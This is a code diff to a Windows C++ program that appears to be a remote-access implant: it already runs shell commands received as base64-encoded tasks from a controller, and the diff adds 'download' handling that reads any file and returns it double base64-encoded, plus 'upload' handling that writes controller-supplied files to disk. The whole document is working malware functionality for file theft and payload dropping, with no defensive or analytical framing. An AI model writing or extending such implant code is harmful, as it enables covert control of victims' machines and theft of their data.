@@ -8,6 +8,7 @@
 #include <cstdio>
 #include <sstream>
 #include <vector>
+#include <fstream>
 #include <algorithm>
 #define UNLEN 127
 #include <psapi.h>
@@ -109,6 +110,12 @@ void wininet_error(const char* msg) {
 }
 
 
+std::vector<unsigned char> read_file_bin(const std::string& filename) {
+    std::ifstream file(filename, std::ios::binary);
+    if(!file) return {};
+    std::vector<unsigned char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+    return buffer;
+}
 
 std::string exec_cmd(const std::string& cmd) {
     std::string result;
@@ -120,6 +127,60 @@ std::string exec_cmd(const std::string& cmd) {
     _pclose(pipe);
     return result;
 }
+
+std::string handle_download(const std::string& filepath) {
+    auto data = read_file_bin(filepath);
+    if(data.empty()) {
+        return "[ERROR] File not found or cannot read.";
+    }
+    std::string encoded_file = base64_encode( base64_encode(std::string(data.begin(), data.end())) );
+    return encoded_file;
+}
+
+
+std::string get_filename(std::string data) {
+    const std::string key = "'filename':";
+    size_t pos = data.find(key);
+    pos += key.length();
+    pos = data.find('\'', pos);
+    pos++;
+    size_t fin = data.find('\'', pos);
+    return data.substr(pos, fin - pos);
+}
+
+std::string get_filecontent(std::string data) {
+    const std::string key = "'content':";
+    size_t pos = data.find(key);
+    pos += key.length();
+    pos = data.find('\'', pos);
+    pos++;
+    size_t fin = data.find('\'', pos);
+    return data.substr(pos, fin - pos);
+}
+
+std::string save_base64_file(const std::string& filename, const std::string& b64_encoded_filecontent) {
+    std::string decoded = base64_decode(b64_encoded_filecontent);
+    std::ofstream outfile(filename.c_str(), std::ios::binary);
+    if(outfile) {
+        outfile.write(decoded.data(), decoded.size());
+        outfile.close();
+        return "File uploaded.";
+    } else {
+        return "File not uploaded.";
+    }
+}
+
+
+std::string handle_upload(std::string data) {
+    std::string file_props = base64_decode(data);
+    std::string filename = get_filename(file_props);
+    std::string b64_encoded_filecontent = get_filecontent(file_props);
+
+    return save_base64_file(filename, b64_encoded_filecontent);
+
+}
+
+
 
 std::string get_task_content(const std::string& json) {
     std::string key = "\"task\":\"";
@@ -157,7 +218,9 @@ std::string parse_task(std::string b64_encoded_task) {
         std::string data_res = exec_cmd(data);
         return base64_encode(data_res);
     } else if (type == "download") {
-        std::cout << "[!] Not implemented." << std::endl;
+        return handle_download(data);
+    } else if (type == "upload") {
+        return handle_upload(data);
     }
     return "";
 }
